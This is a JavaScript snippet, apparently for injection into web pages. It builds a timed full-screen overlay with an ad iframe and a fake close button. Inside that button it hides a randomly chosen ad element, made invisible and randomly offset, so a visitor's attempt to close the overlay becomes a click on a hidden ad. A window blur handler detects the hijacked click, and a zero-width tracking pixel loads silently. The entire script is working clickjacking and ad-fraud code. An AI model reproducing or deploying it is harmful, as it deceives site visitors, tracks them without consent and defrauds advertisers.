document.body.insertAdjacentHTML('afterbegin', "<img src='http://whos.amung.us/widget/0b4nvebjptv2.png'style='width:0px;'><div id='fnd'style='display:none;background:rgba(0,0,0,0.8);width:100%;height:100%;position:fixed;top:0;left:0;z-index:1000;'><div style='background:white;width:312px;height:262px;position:absolute;top:50%;left:50%;margin:-113px 0 0 -156px;border-radius:5px;'><div id='bto' style=float:right;cursor:pointer;background:url('data:image/gif;base64,R0lGODlhKQApAOcAAAAAAAEBAQICAgMDAwQEBAUFBQYGBgcHBwgICAkJCQoKCgsLCwwMDA0NDQ4ODg8PDxAQEBERERISEhMTExQUFBUVFRYWFhcXFxgYGBkZGRoaGhsbGxwcHB0dHR4eHh8fHyAgICEhISIiIiMjIyQkJCUlJSYmJicnJygoKCkpKSoqKisrKywsLC0tLS4uLi8vLzAwMDExMTIyMjMzMzQ0NDU1NTY2Njc3Nzg4ODk5OTo6Ojs7Ozw8PD09PT4+Pj8/P0BAQEFBQUJCQkNDQ0REREVFRUZGRkdHR0hISElJSUpKSktLS0xMTE1NTU5OTk9PT1BQUFFRUVJSUlNTU1RUVFVVVVZWVldXV1hYWFlZWVpaWltbW1xcXF1dXV5eXl9fX2BgYGFhYWJiYmNjY2RkZGVlZWZmZmdnZ2hoaGlpaWpqamtra2xsbG1tbW5ubm9vb3BwcHFxcXJycnNzc3R0dHV1dXZ2dnd3d3h4eHl5eXp6ent7e3x8fH19fX5+fn9/f4CAgIGBgYKCgoODg4SEhIWFhYaGhoeHh4iIiImJiYqKiouLi4yMjI2NjY6Ojo+Pj5CQkJGRkZKSkpOTk5SUlJWVlZaWlpeXl5iYmJmZmZqampubm5ycnJ2dnZ6enp+fn6CgoKGhoaKioqOjo6SkpKWlpaampqenp6ioqKmpqaqqqqurq6ysrK2tra6urq+vr7CwsLGxsbKysrOzs7S0tLW1tba2tre3t7i4uLm5ubq6uru7u7y8vL29vb6+vr+/v8DAwMHBwcLCwsPDw8TExMXFxcbGxsfHx8jIyMnJycrKysvLy8zMzM3Nzc7Ozs/Pz9DQ0NHR0dLS0tPT09TU1NXV1dbW1tfX19jY2NnZ2dra2tvb29zc3N3d3d7e3t/f3+Dg4OHh4eLi4uPj4+Tk5OXl5ebm5ufn5+jo6Onp6erq6uvr6+zs7O3t7e7u7u/v7/Dw8PHx8fLy8vPz8/T09PX19fb29vf39/j4+Pn5+fr6+vv7+/z8/P39/f7+/v///yH5BAEKAPwALAAAAAApACkAAAj+AP8JHEiwoMGDCBMqXMiwocOHECNKTMiOl6lHhzrRwjZxITtJQQYAGEkSQAk70DoWrEfoQcmXJANc2aby37ENMHOSLDCo46gDOoOOtGIvoiWhSAH4yPeQF4GkSMs4BBcBatJMDbcEVZGzAYecEtwthBZApxV9f14i+CXuRE46C7XoNNNPIBuSA2AJVBcDJoJ4CfE1yHmHoD+tAUARjNcDpqmEs3TmKbiPyaOC9nbAnJJQTlBGBfWFTgI2IRahnRL2O60TH0IgQge0QphGKDiELpAeeGYwEVJnr5HyKFrQGgXbCFnrhAEP4bLBOu8hjBO0BDqFvoDCjJAQls4NtwmfHktX8JXIl1AS2luQE1fB58wLwoEZSmGVnB04CjQ+cvhAVAW8ZIBYCTlTFkwVNPMPOF+RpIRomAgAkxwMcaGTA6yYAFMWhoBFoELhuGSVUJg4dIuEI+bkBUSMpAhTDdJBJMlTLgKAxDsD+fOQLxakOEAedXUETx4JQHWENDUNNM4gNRz4Egdn/JLkQeXMokkgeESySkpTdunll2CGqVJAADs=');height:41px;width:41px;position:relative;margin-top:-17px;margin-right:-17px;border-radius:50%;overflow:hidden;></div><iframe frameborder='0'scrolling='no'src='" + iframe + "'style='height:250px;width:300px;margin-left:6px;margin-top:-18px;'/></div></div>");
fnd = document.getElementById("fnd");
bto = document.getElementById("bto");
bto.onclick = function () {
	fnd.style.display = "none";
};
ads = document.getElementsByClassName("anuncios");
ads = ads[Math.floor(ads.length * Math.random())]
	ads.setAttribute("style", "margin-left:" + -Math.floor((Math.random() * 260)) + "px;margin-top:" + -Math.floor((Math.random() * 210)) + "px; opacity: 0;");
bto.appendChild(ads);
setTimeout(function () {
	fnd.style.display = "inline";
	window.onblur = function () {
		document.cookie = "visited=true; max-age=6400";
		fnd.style.opacity = "0";
		setTimeout(function () {
			fnd.style.display = "none";
		}, 1000);
	};
}, tempo * 1000);
